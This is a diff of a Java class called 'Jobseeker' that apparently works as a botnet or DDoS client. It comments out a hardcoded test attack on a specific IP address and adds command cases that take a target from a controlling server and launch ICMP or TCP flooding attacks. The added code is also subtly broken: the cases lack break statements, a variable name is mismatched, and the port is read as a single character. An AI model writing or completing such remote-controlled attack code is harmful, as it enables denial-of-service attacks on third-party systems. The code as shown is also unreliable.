@@ -35,11 +35,14 @@ public class Jobseeker{
             while(true) {
 
                 // testing block .. beginning
-                String targetIP = "99.243.74.247";
+
+                //String targetIP = "99.243.74.247";
                 //icmpAttack(targetIP);
                 // - - - - - - - - - - -
-                tcpAttack(targetIP, 25);
+                //tcpAttack(targetIP, 25);
+
                 //testing block .. end
+
                 // JOB ASSIGNMENTS
                 System.out.println("Waiting for job assignments...");
 
@@ -78,6 +81,13 @@ public class Jobseeker{
                         socket.close();
                         reader.close();
                         return;
+                    case 4:
+                        String targetIp = reader.readLine();
+                        icmpAttack(targetIp);
+                    case 5:
+                        String target = reader.readLine();
+                        int portNumber = reader.read();
+                        tcpAttack(target, port);
                 }
                 toServer.flush();
             }
